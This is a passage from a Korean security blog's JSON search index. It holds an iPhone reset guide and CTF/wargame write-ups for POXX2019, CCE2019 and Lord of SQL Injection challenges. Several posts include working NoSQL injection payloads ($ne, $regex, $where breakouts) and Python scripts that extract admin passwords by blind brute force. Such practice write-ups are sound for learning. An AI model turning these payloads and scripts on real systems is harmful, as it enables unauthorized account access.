        "content": "나는 아이폰을 탈옥하기 전에 먼저 초기화를 했다.내가 사용하던 폰이라 지저분 했기 때문이다.그런데 iTunes를 통해 공장초기화를 진행하면, 가장 최신 OS로 업데이트 되기 때문에 iTunes 없이 초기화를 하는 방법을 사용했다.초기화 방법은 다음과 같다.1. 설정 &gt; 일반 &gt; 재설정2. 모든 콘텐츠 및 설정 지우기3. (iCloud에 백업중인 데이터가 없을 경우) 지금 지우기4. 패스워드 입력5. iPhone 지우기이 후, iTunes 계정의 패스워드를 입력 해 주면 폰이 재부팅 되며 초기화 된다.",
        "url": "//pentesting/ios/2019/12/10/iOS-initialize.html"
      }
      ,
    
      "ctf-2019-2019-10-15-ctf-poxx2019-quals-html": {
        "title": "[POXX2019-Quals] magic2 / Clue Write up",
        "tags": "Write-up, CTF, POXX2019",
        "date": "October 15, 2019",
        "author": "",
        "category": "",
        "content": "두 달만의 포스팅이다.한동안 CTF를 안하다가 POXX 2019 예선에 참가하게 되었다.예선에서 내가 푼 문제를 정리 해 두려 한다.magic2문제에 접속하면 바로 코드가 보인다.코드는 아래와 같다.&lt;?phpinclude 'config.php';show_source(__FILE__);echo '&lt;hr&gt;';$rflag = $flag;if (!$_GET['a']) die('plz start');if ($flag[0] != $_GET['a']) die('stage1');if ($flag[strlen($flag)-1] != $_GET['b']) die('stage2');if ($flag[1] == $_GET['c']) die('stage3');if ($flag[0] == $_GET['a'] &amp;&amp;     $flag[strlen($flag)-1] == $_GET['b'] &amp;&amp;    $flag[strlen($flag)-3] == $_GET['c'])    $flag = substr($flag, rand() % strlen($flag), rand() % strlen($flag));else    die('stage4');if ($flag[0] != $_GET['A']) die('stage5');if ($flag[strlen($flag)-1] != $_GET['B']) die('stage6&lt;!--Hint: '.$flag);if ($flag[1] == $_GET['C']) die('stage7');if ($flag[0] == $_GET['A'] &amp;&amp;     $flag[strlen($flag)-1] == $_GET['B'] &amp;&amp;    $flag[strlen($flag)-3] == $_GET['C'])    $flag = substr($flag, rand() % strlen($flag), rand() % strlen($flag));else    die('stage8');if ($flag[0] != $_GET['q']) die('stage9');if ($flag[strlen($flag)-1] != $_GET['w']) die('stage10&lt;!--Hint: '.$flag);if ($flag[1] == $_GET['e']) die('stage11');if ($flag[0] == $_GET['q'] &amp;&amp;     $flag[strlen($flag)-1] == $_GET['w'] &amp;&amp;    $flag[strlen($flag)-3] == $_GET['e'])    $flag = substr($flag, rand() % strlen($flag), rand() % strlen($flag));else    die('stage12');if ($flag[0] != $_GET['Q']) die('stage13');if ($flag[strlen($flag)-1] != $_GET['W']) die('stage14&lt;!--Hint: '.$flag);if ($flag[1] == $_GET['E']) die('stage15');if ($flag[0] == $_GET['Q'] &amp;&amp;     $flag[strlen($flag)-1] == $_GET['W'] &amp;&amp;    $flag[strlen($flag)-3] == $_GET['E'])    die(\"Flag: $rflag\");else    die(\"final stage! but game is over, and you lose! :p&lt;!-- $flag\");소스코드를 살펴보면 각 스테이지마다 $flag의 특정 위치의 값을 맞춰야 해당 스테이지를 통과할 수 있게 되어있다.그런데 3~5개의 스테이지가 지날 때 마다 $flag의 값은 이 전의 $flag의 값에서 랜덤한 위치부터 랜덤한 갯수의 문자를 잘라 다시 $flag에 넣는다. 때문에 모든 스테이지를 통과하더라도 모든 $flag의 값을 읽을 수 없다.그래서 그냥 중간에 보면 Hint라고 현재 $flag에 저장된 값을 출력 해 주는데, 여기에서 전체 flag의 값을 최대한 많이 출력 해 주길 바라면서 여러 번 실행시켰다.소스코드는 아래와 같다.import urllib2import urllibimport requestsa = \"\"length = 0url = \"http://167.179.71.234/pox/?\"print \"[+] Start\"for i in range(48, 127):        try:                query = url + \"a=\" + chr(i)                r = requests.post(query)        except:                print \"[-] Error occur\"                continue        if '&lt;/code&gt;&lt;hr&gt;stage2' in r.text and '&lt;/code&gt;&lt;hr&gt;plz start' not in r.text:                a += chr(i)b = \"\"for i in range(48, 127):        try:                query = url + \"a=\" + a + \"&amp;b=\" + chr(i)                r = requests.post(query)        except:                continue        if '&lt;/code&gt;&lt;hr&gt;stage2' not in r.text and '&lt;/code&gt;&lt;hr&gt;stage1' not in r.text:                b += chr(i)c_2 = \"\"for i in range(48, 127):        try:                query = url + \"a=\" + a + \"&amp;b=\" + b + \"&amp;c=\" + chr(i)                r = requests.post(query)        except:                continue        if '&lt;/code&gt;&lt;hr&gt;stage3' in r.text:                c_2 += chr(i)c_3 = \"\"for i in range(48, 127):        try:                query = url + \"a=\" + a + \"&amp;b=\" + b + \"&amp;c=\" + chr(i)                r = requests.post(query)         except:                continue        if '&lt;/code&gt;&lt;hr&gt;stage5' in r.text:                c_3 += chr(i)hint = \"\"A = \"\"for i in range(48, 127):        try:                query = url + \"a=\" + a + \"&amp;b=\" + b + \"&amp;c=\" + c_3 + \"&amp;A=\" + chr(i)                r = requests.post(query)        except:                continue        if '&lt;/code&gt;&lt;hr&gt;stage6' in r.text:                hint = r.text.split('&lt;/code&gt;&lt;hr&gt;stage6&lt;!--Hint: ')[1]                print \"[+] Hint :\", hint                A += chr(i)print \"[+] End\"이 코드를 실행 시킬 때 마다 플래그가 조금 씩 나타나고, 여러 번 실행 시켜서 조합하면 전체 플래그를 얻을 수 있다.FLAG : POX{kong_wanted_to_make_problem_xD_flag_will_be_long_long?_wrong_:p}Clue이 문제에서는 파일 3개가 주어졌다.  clue.bas  clue.frm  clue.frx그 중 clue.bas랑 clue.frm은 Excel로 열 수 있었는데, clue.frx는 안됬다.그래서 뭔가 읽을 수 있는 문자를 찾을 수 있지 않을까 하면서 HxD로 열어 봤더니 아래와 같았다.대부분은 알아볼 수 없었는데 읽을 수 있는 문자열을 찾다보니 아래의 두 문장을 찾을 수 있었다.u5k624kcu_ngemct_suc_pdg_v_eibcUHVibGljIEZ1bmN0aW9uIGdoaShCeVZhbCBqa2wgQXMgU3RyaW5nKSBBcyBTdHJpbmcgRGltIGljTGVuIEFzIEludGVnZXIgRGltIGljTmV3VGV4dCBBcyBTdHJpbmcgRGltIGFiYyBBcyBTdHJpbmcgRGltIGkgQXMgSW50ZWdlciBhYmMgPSAiIiAgICBpY0xlbiA9IExlbihqa2wpICAgIEZvciBpID0gMSBUbyBpY0xlbiAgICAgICAgYWJjID0gTWlkKGprbCwgaSwgMSkgICAgICAgIFNlbGVjdCBDYXNlIEFzYyhhYmMpICAgICAgICAgICAgQ2FzZSA2NSBUbyA5MCAgICAgICAgICAgICAgICBhYmMgPSBDaHIoQXNjKGFiYykgWG9yIFVzZXJGb3JtMS5YT1IxLkNhcHRpb24pICAgICAgICAgICAgQ2FzZSA5NyBUbyAxMjIgICAgICAgICAgICAgICAgYWJjID0gQ2hyKEFzYyhhYmMpIFhvciBVc2VyR m9 ybTEuWE9SMi5DYXB0aW9uKSAgICAgICAgICAgIENhc2UgNDggVG8gNTcgICAgICAgICAgICAgICAgYWJjID0gQ2hyKEFzYyhhYmMpIFhvciBVc2VyR m9 ybTEuWE9SMy5DYXB0aW9uKSAgICAgICAgICAgIENhc2UgMzIgICAgICAgICAgICAgICAgYWJjID0gQ2hyKDMyKSAgICAgICAgRW5kIFNlbGVjdCAgICAgICAgaWNOZXdUZXh0ID0gaWNOZXdUZXh0ICsgYWJjICAgIE5leHQgICAgZ2hpID0gZGVmIEZ1bmN0aW9u근데 아래 문장이 Base64 Encoding 된 값으로 보이길래 이를 Decoding 해 보았더니 아래의 코드를 얻을 수 있었다.Public Function ghi(ByVal jkl As String) As String        Dim icLen As Integer        Dim icNewText As String        Dim abc As String        Dim i As Integer        abc = \"\"        icLen = Len(jkl)        For i = 1 To icLen                abc = Mid(jkl, i, 1)                Select Case Asc(abc)                Case 65 To 90      // Capital letters                        abc = Chr(Asc(abc) Xor UserForm1.XOR1.Caption)                Case 97 To 122     // small letters                        abc = Chr(Asc(abc) Xor UserForm1.XOR2.Caption)                Case 48 To 57         // numbers                        abc = Chr(Asc(abc) Xor UserForm1.XOR3.Caption)                Case 32                        abc = Chr(32)    // space bar                End Select                icNewText = icNewText + abc        Next        ghi = def Functionabc의 값을 UserForm1에 있는 XOR1, XOR2, XOR3의 캡션 값과 xor 연산을 하는 코드이다.그런데 이 UserForm1은 Excel에서 열었던 clue.frm의 캡션 값이었다.그래서 Excel을 통해 다른 개체들의 캡션을 찾아 보았다.각각의 캡션 값을 확인하면 다음과 같다.해당 값을 가지고 flag를 얻기 위해 아래처럼 코드를 짰다.flag = \"u5k624kcu_ngemct_suc_pdg_v_eibc\"xor1 = 7xor2 = 6xor3 = 5FLAG = \"POX{\"for i in range(len(flag)):\tchar = flag[i]\tif ord(char) &gt; 64 and ord(char) &lt; 91:\t\tFLAG = FLAG + chr(ord(char) ^ xor1)\telif ord(char) &gt; 96 and ord(char) &lt; 123:\t\tFLAG = FLAG + chr(ord(char) ^ xor2)\telif ord(char) &gt; 47 and ord(char) &lt; 58:\t\tFLAG = FLAG + chr(ord(char) ^ xor3)\telif ord(char) == 32:\t\tFLAG = FLAG + \" \"\telif ord(char) == 95:\t\tFLAG = FLAG + \"_\"위의 코드를 실행 한 결과 아래와 같이 flag를 얻을 수 있었다.FLAG : POX{s0m371mes_hacker_use_vba_p_code}",
        "url": "//ctf/2019/2019/10/15/ctf-poxx2019-quals.html"
      }
      ,
    
      "ctf-2019-2019-10-15-ctf-cce2019-html": {
        "title": "[CCE2019] hwp Write up",
        "tags": "Write-up, CTF, CCE2019",
        "date": "October 15, 2019",
        "author": "",
        "category": "",
        "content": "POXX Write up을 정리하다 보니 몇 주 전에 했던 CCE도 생각이 났다.그래서 걔도 정리 해 두려 한다 ㅎㅎ내가 푼 문제는 hwp였다.문제에서는 report.hwpx 파일 한개만 주어진다.그런데 열어봐도 별다른 건 없어보였다.그래서 그냥 확장자를 zip으로 바꾸고 압축을 풀어보았더니 BinData 디렉토리 아래에서 image1.ps라는 파일을 찾을 수 있었다.ps 파일은 PostScript 파일이라고 한다.포스트스크립트 - 위키백과그런데 이 파일이 뭔가 한글 악성코드에 많이 쓰이나보다.한글 악성코드로 검색하니까 Post Script를 분석 한 글을 쉽게 찾을 수 있었다.어쨌든 스크립트 파일이라고 하니까 이를 텍스트 에디터에서 열어 보았다.Sublimetext에 메모장에 VSCode로도 열어봤는데 여는데 오래걸리거나 결국 다 터져서 HxD랑 Notepad++로 겨우 확인할 수 있었다.열면 이런식으로 엄청나게 많은 코드를 확인할 수 있다.처음에는 이 아래의 코드를 다 분석했었다.그런데 다 분석하고 보니 그냥 해쉬값 처럼 생긴 변수를 String으로 선언하고 하나씩 글자를 넣는 형태인데다가, 중간에 의미없는 1 sub나 1 add가 너무 많았다.그리고 저 변수들에 다 값을 넣어서 파일 35를 만들었는데 아무리 봐도 실행파일도 아니고 스크립트 파일도 아니라서 반쯤 포기했었다.그러다가 맨 상단에 /CCE2019 하고 아래처럼 선언 된 부분이 도대체 무슨 값인지 모르겠어서 얘를 HxD에서 열어 보았다./CCE2019 &lt;2e39f57b3338326348657473b9966e64f665774c6f676963027567386164397d6363657b303832634c65747346696e644e65774c6f67696342756738d164397d6d7cdf75308c3bae6ddd753f8b483a0c2716573c1d080e112318475b000a57121743071e104a470d6c0c1a5302263d44230a1329416a6469667567386164397dd6e357a4c1d96eefbd8428ffb78832e8cbef2fc19f8635efc7ff39b5918565f1310a0613c1d96eef4c65747346696e641e20774c23666b63f68729656164397d6363657bd038306247647a67466b6e644e67774c6f676963426567386174397d6343657b303872634c757473466b6e644865774c6f676963447567386164397d6353657b303a32634c65747344692ee14e65674c6f776963427577386174397d6363657b203832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963425567387d64397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832636211110b32696e648d64774c6f776963427767386166397d6363657b303832634c65747366696e046017132d1b0669631e7567386144397d6361657b303c32634c65747346696e644e65774c2f676923427567386164397d36e88987d8b132634c05fd9677bb0aef1c55fc1e63ec3b77c9074f37d62e1f4c9c52a5d70c594e616045b5bc4b68a986be3720c73d77e2217e74b7b3211cbcbd172964ab60b37a7bc73d5472958a522dc551fc4db956965282d9a6f76c65fe45831691784dc0091e6810962bcd314a659d03fc4024ec317f43a6ec3cea65e9f4274741206b596b391d9a942b1933e576a5e32a2401021d632a020e5608eddf290b2f125d37c7e752b3322324113f065e181cd0b3ba8c0a3873bc36690b67682c0bd8647b306b620b1becebb5b9bc852b1754a51e07675bc3c627356a3036691588364b40cfedbba526752f1bc65a6e64c7851d483f0d76352a0021a6e79bec4c9c34322c676e5a4e4a7d0f8c93ecae116e2e78c812676963a9a48ea861643995cf9c9a841f707c2004001803680c16014e8e1c7daf383909401f65680b66537f340bbf8dea77cdb6df54b415fe6d6d4d8a31fa004b6f58a3f6763769370c2bebea819aaeb5f8464e14e0b40750036e301ee8336863373a0b6f22c9639eb1ba916788ab2858fea4e41e9aa119463e0655c50af0b3ba0d690bb2c0c56e9eb1d1ed9c9c9a337e7b7a0620155a163e0c6e8c4d9a88b30e131d02211e024a4f075610633ea67b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b84ca7c3e4c6574734b696e640e65774c734769635e7167386164397d6373657bf33932636211110b324d030a4e65774c6f4769635e7567384f165d1c1702657b2c1832630c657473681b0a053a045336151d0d01257567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d6363657b303832634c65747346696e644e65774c6f676963427567386164397d&gt;그랬더니 짜란~ flag가 나왔다…ㅂㄷㅂㄷ난 이것도 모르고 3시간을 넘게 밑에 코드만 분석하고 있었다…ㅎㅎ그래서 이 값을 인증했는데 또 인증 해 보니 flag가 아니라고 했다.문제 디스크립션을 다시 읽어보니 flag의 값은 30초마다 변한다고 적혀 있었다…그래서 아래와 같이 소스코드를 짜서 flag의 값을 구했다.import requestsimport osimport zipfileimport shutilurl = \"http://hwp3.cstek.shop/report.hwpx\"r = requests.get(url, allow_redirects=True)open(\"report.zip\", \"wb\").write(r.content)report = zipfile.ZipFile(\"./report.zip\")report.extractall()f = open(\"./BinData/image1.ps\")data = f.readline()[0xbca:0xc0a]flag = \"\"for i in range(0, len(data), 2):\tflag = flag + chr(int(data[i:i+2], 16))print flagos.remove(\"report.zip\")os.remove(\"settings.xml\")os.remove(\"mimetype\")os.remove(\"version.xml\")shutil.rmtree(\"BinData\")shutil.rmtree(\"Preview\")shutil.rmtree(\"META-INF\")shutil.rmtree(\"Contents\")그 결과 앞서 구한 값과 가운데 문자열은 같고 앞의 4글자와 뒤의 4글자가 다른 flag 값을 얻어 인증할 수 있었다.FLAG : cce{082cLetsFindNewLogicBug8ad9}이번에는 삽질하느라 시간을 너무 허비했는데 다음에는 제발 삽질하지 않고 한문제만 더 풀 수 있었으면 좋겠다 ㅎㅎ",
        "url": "//ctf/2019/2019/10/15/ctf-cce2019.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-08-07-los-incubus-html": {
        "title": "[Lord of SQL Injection] LoS - incubus 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 7, 2019",
        "author": "",
        "category": "",
        "content": "드디어!!! 마지막 문제인 incubus이다.문제를 푼 시간보다 풀이를 적는 시간이 더 오래 걸렸던 것 같다..코드는 다음과 같다.--------------------------------------------------------------------------query : {\"$where\":\"function(){return obj.id==''&amp;&amp;obj.pw=='';}\"}--------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  if(preg_match('/prob|_|\\(/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\(/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = array(\"\\$where\" =&gt; \"function(){return obj.id=='{$_GET['id']}'&amp;&amp;obj.pw=='{$_GET['pw']}';}\");  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  $query = array(\"id\" =&gt; \"admin\");  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));  if($result['pw'] === $_GET['pw']) solve(\"incubus\");  highlight_file(__FILE__);?&gt;이번에도 id가 admin일 때의 pw 값을 알아야 한다.그런데 이번 문제에서는 조금 다른게 쿼리가 함수 형태로 들어갔다는 것이다.함수 형태로 들어가 있더라도, 내가 입력 한 값에 대해서는 특별한 검증이 없기 때문에 공격이 가능하다.내가 주로 고민했던 부분은 obj.pw에서 한 글자 씩을 어떻게 비교 할 것이냐는 부분이었다.그런데 여러가지 테스트를 해 보다가 obj.pw[0]과 같이 사용하면 한 글자 씩 사용할 수 있는 것을 확인할 수 있었다.일단 공격을 수행하기 위해서는 내가 의도한 코드를 실행시켜야 하는데, 여기에서는 소스코드를 이어서 적는 방법으로 함수의 흐름을 변경할 수 있다.소스코드를 이어서 적는 방법이라고 하니 뭔가 이상한데, 예를 들면 이런 것이다.Testing for NoSQL injection여기의 예시를 보면, 아래와 같은 코드가 있다.db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits &lt; $userInput; } } );;이 때, $userInput에 대한 검증과정이 없다면 아래와 같은 코드를 $userInput으로 삽입하는 것이 가능하다.(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); return Math.max();})()그 결과, 완성되는 코드는 다음과 같다.function () { return obj.credits - obj.debits &lt; (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); return Math.max();})(); }즉, 입력 값에 내가 실행하고자 하는 소스코드를 입력하여 함수의 흐름을 바꾸는 것이다.나는 id가 admin일 때의 pw 값을 구해야 하므로, 실행되어야 하는 코드는 다음과 같은 형태여야 pw를 한 글자 씩 비교 해 전체 값을 알아낼 수 있다.function(){return obj.id=='admin'&amp;&amp;obj.pw[0]=='a';}따라서 내가 입력 한 값은 다음과 같다.?id=admin'&amp;&amp;obj.pw[0]='a';'이렇게 하면 $query에서 완성되는 코드는 다음과 같다.function(){return obj.id=='admin'&amp;&amp;obj.pw[0]=='a';''&amp;&amp;obj.pw=='';}만약 obj.id가 admin이고 obj.pw의  첫 번째 글자가 a라면 return true가 될 것이고, 뒤의 ''&amp;&amp;obj.pw=='';는 별 다른 영향을 미치지 못할 것이다.이를 바탕으로 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsimport timeflag = \"\"length = 40url = \"https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php?id=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")end = Falseprint \"[+] Start\"print \"[+] Find password\"\tfor j in range(0, length + 1):\tfor i in range(48, 123):\t\ttry:\t\t\tstart = time.time()\t\t\tquery = url + \"admin'%26%26obj.pw[\" + str(j) + \"]=='\" + str(chr(i)) + \"';'\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' in r.text:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j + 1), \":\", flag\t\t\tbreak\t\tif i == 122:\t\t\tend = True\t\t\tprint \"[+] Maybe it's end of the password\"\t\t\tbreak\tif end:\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"이를 실행하면 다음과 같다.$ python ex.py[+] Start[+] Find password[+] Found 1 : b[+] Found 2 : b4[+] Found 3 : b47[+] Found 4 : b478[+] Found 5 : b4782[+] Found 6 : b47822[+] Found 7 : b47822e[+] Found 8 : b47822ea[+] Maybe it's end of the password[+] Found password :  b47822ea[+] End와 드디어 마지막 플래그 값을 얻었다!이를 아래와 같이 입력하면 문제를 풀 수 있다.?id=admin&amp;pw=b47822ea-----------------------------------------------------------------------------------query : {\"$where\":\"function(){return obj.id==''&amp;&amp;obj.pw=='b47822ea';}\"}-----------------------------------------------------------------------------------INCUBUS Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  if(preg_match('/prob|_|\\(/i', $_GET['id'])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\(/i', $_GET['pw'])) exit(\"No Hack ~_~\");  $query = array(\"\\$where\" =&gt; \"function(){return obj.id=='{$_GET['id']}'&amp;&amp;obj.pw=='{$_GET['pw']}';}\");  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  $query = array(\"id\" =&gt; \"admin\");  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));  if($result['pw'] === $_GET['pw']) solve(\"incubus\");  highlight_file(__FILE__);?&gt;INCUBUS Clear드디어 Lord of SQL Injection을 또 다시 All Clear 했다!너무 신난다 히히힣지난번에 풀 때에는 모르는게 좀 많아서 물어보면서 했었는데, 이번에는 퇴근하고 매일매일 혼자 풀어서 올클을 한 거라 더욱 뿌듯했다.이제는 다른 공부거리를 찾아봐야 겠다.Lord of SQL Injection All Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/08/07/los-incubus.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-08-06-los-siren-html": {
        "title": "[Lord of SQL Injection] LoS - siren 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 6, 2019",
        "author": "",
        "category": "",
        "content": "MongoDB의 두 번째 문제인 siren이다.이번 문제를 풀기 위해서는 소스코드를 구현해야 한다.코드는 다음과 같다.---------------------------------query : {\"id\":null,\"pw\":null}---------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  $query = array(    \"id\" =&gt; $_GET['id'],    \"pw\" =&gt; $_GET['pw']  );  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello User&lt;/h2&gt;\";  $query = array(\"id\" =&gt; \"admin\");  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));  if($result['pw'] === $_GET['pw']) solve(\"siren\");  highlight_file(__FILE__);?&gt;이번 문제를 풀기 위해서는 id가 admin일 때의 pw 값을 정확하게 알아야 한다.따라서 Blind SQL Injection을 사용하여 pw의 값을 알아내야 한다.어떻게 풀까 찾아 보다가 $regex를 찾을 수 있었다.$regex을 사용하면 정규표현식을 활용 해 패턴으로 검색을 할 수 있다.사용법은 다음과 같다.?id=admin&amp;pw[$regex]=^여기서 ^는 MySQL에서의 %와 같은 역할을 한다.따라서 ^ 뒤에 문자를 하나씩 추가 해 pw의 값을 하나 씩 알아낼 수 있다.이를 위해 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsflag = \"\"url = \"https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php?id=admin&amp;pw[$regex]=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find password\"for j in range(1, 10):\tfor i in range(48, 123):\t\tif i != 0x3f:\t\t\tfound = 0\t\t\ttry:\t\t\t\tquery = url + \"^\" + flag + chr(i)\t\t\t\tr = requests.post(query, cookies=session)\t\t\texcept:\t\t\t\tprint \"[-] Error occur\"\t\t\t\tcontinue\t\t\tif 'Hello User' in r.text:\t\t\t\tflag += chr(i)\t\t\t\tfound = 1\t\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\t\tbreak\tif not found:\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"실행 한 결과는 다음과 같다.$ python ex.py[+] Start[+] Find password[+] Found 1 : 1[+] Found 2 : 15[+] Found 3 : 158[+] Found 4 : 1588[+] Found 5 : 1588f[+] Found 6 : 1588f5[+] Found 7 : 1588f5a[+] Found 8 : 1588f5a3[+] Found password :  1588f5a3[+] End결과로 나온 값을 아래와 같이 입력하면 문제를 풀 수 있다.?id=admin&amp;pw=1588f5a3----------------------------------------------------------query : {\"id\":\"admin\",\"pw\":\"1588f5a3\"}----------------------------------------------------------Hello UserSIREN Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  $query = array(    \"id\" =&gt; $_GET['id'],    \"pw\" =&gt; $_GET['pw']  );  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello User&lt;/h2&gt;\";  $query = array(\"id\" =&gt; \"admin\");  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));  if($result['pw'] === $_GET['pw']) solve(\"siren\");  highlight_file(__FILE__);?&gt;SIREN Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/08/06/los-siren.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-08-05-los-cerberus-html": {
        "title": "[Lord of SQL Injection] LoS - cerberus 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 5, 2019",
        "author": "",
        "category": "",
        "content": "드디어 MSSQL이 끝나고 이번엔 MongoDB로 넘어왔다.문제 이름은 cerberus이다.코드는 다음과 같다.---------------------------------query : {\"id\":null,\"pw\":null}---------------------------------&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  $query = array(    \"id\" =&gt; $_GET['id'],    \"pw\" =&gt; $_GET['pw']  );  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_cerberus-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  if($result['id'] === \"admin\") solve(\"cerberus\");  highlight_file(__FILE__);?&gt;코드는 간단하다.id가 admin인 행을 추출하면 된다.그래서 인터넷에 mongodb sql injection이라고 검색을 해 보았더니 자료가 엄청 많이 나왔다.MongoDB는 NoSQL이라고 한단다.  NoSQL      Not Only SQL로 불리기도 하며, SQL만을 사용하지 않은 DBMS비관계형 데이터베이스즉, 데이터의 관계를 정의하지 않고 사용하는 DB  아래 블로그에서 NoSQL과 일반 SQL DB 사이의 차이점을 쉽게 설명 해 주었다.NOSQL Injection from MongoDB위의 블로그를 읽은 후, 문제의 소스코드를 보면 문제에서는 find($query)를 이용하여 select * from prob_cerberus where id=$_GET['id'] and pw=$_GET['pw'] 형태의 쿼리를 실행했다는 것을 알 수 있었다.그런데 이 때, Array 형태로 구성되어 있는 $query 안에 또 다시 관계를 나타내는 Array를 삽입 해 의도하지 않은 결과를 가져올 수 있다고 한다.가장 자주 쓰이는 것이 $ne인 것 같은데, 이는 !=과 동일한 기능을 하는 문자이다.따라서 해당 쿼리에서 pw=$_GET['pw'] 부분을 pw!=$_GET['pw']로 만들어 id는 admin이지만, pw의 값이 내가 입력한 값이 아닌 데이터를 불러오도록 조작할 수 있다.위의 블로그에서는 테스트 환경에서 소스코드를 짜서 구성했는데, 나는 그냥 배열 형태로 아래와 같이 넣어주었다.?id=admin&amp;pw[$ne]=asd그럼 완성되는 $query의 내용은 아래와 같을 것이다.{\"id\" : \"admin\", \"pw\" : {\"$ne\":\"asd\"}}즉, SQL의 where 절과 같이 바꾸어 보면 다음과 같다.where id = \"admin\" and pw != \"asd\"따라서 아래와 같이 문제를 풀 수 있게 된다.----------------------------------------------------------query : {\"id\":\"admin\",\"pw\":{\"$ne\":\"asd\"}}----------------------------------------------------------Hello adminCERBERUS Clear!&lt;?php  include \"./config.php\";  login_chk();  $db = mongodb_connect();  $query = array(    \"id\" =&gt; $_GET['id'],    \"pw\" =&gt; $_GET['pw']  );  echo \"&lt;hr&gt;query : &lt;strong&gt;\".json_encode($query).\"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = mongodb_fetch_array($db-&gt;prob_cerberus-&gt;find($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  if($result['id'] === \"admin\") solve(\"cerberus\");  highlight_file(__FILE__);?&gt;CERBERUS Clear",
        "url": "//wargame/lord%20of%20sql%20injection/2019/08/05/los-cerberus.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-08-04-los-kraken-html": {
        "title": "[Lord of SQL Injection] LoS - kraken 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 4, 2019",
        "author": "",
        "category": "",
